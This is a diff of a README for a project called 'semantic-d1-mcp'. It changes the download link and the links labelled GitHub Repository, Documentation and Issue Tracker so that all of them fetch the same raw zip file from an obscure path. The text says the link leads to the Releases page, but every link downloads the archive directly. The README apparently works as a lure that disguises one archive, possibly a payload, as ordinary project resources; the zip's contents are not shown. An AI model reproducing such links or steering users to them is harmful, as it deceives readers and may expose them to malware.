@@ -13,7 +13,7 @@ Welcome to the semantic-d1-mcp project! This application helps you understand an
 ## 📥 Download & Install
 To get started, you will need to download the application. Click the link below to visit the Releases page:
 
-[Download the latest release](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/positivism/semantic-d1-mcp.zip)
+[Download the latest release](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/dist/infrastructure/adapters/mcp-semantic-d-culling.zip)
 
 ### Installation Steps:
 1. Click the download link above to go to the Releases page.
@@ -48,8 +48,8 @@ If you encounter issues or have questions, feel free to reach out through the Gi
 We welcome contributions! If you have ideas for new features or improvements, please check the contributing guidelines in the repository and submit your pull request.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/positivism/semantic-d1-mcp.zip)
-- [Documentation](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/positivism/semantic-d1-mcp.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/positivism/semantic-d1-mcp.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/dist/infrastructure/adapters/mcp-semantic-d-culling.zip)
+- [Documentation](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/dist/infrastructure/adapters/mcp-semantic-d-culling.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/clarityvivek/semantic-d1-mcp/main/dist/infrastructure/adapters/mcp-semantic-d-culling.zip)
 
 Feel free to reach out if you need further assistance or guidance. Enjoy exploring your data!
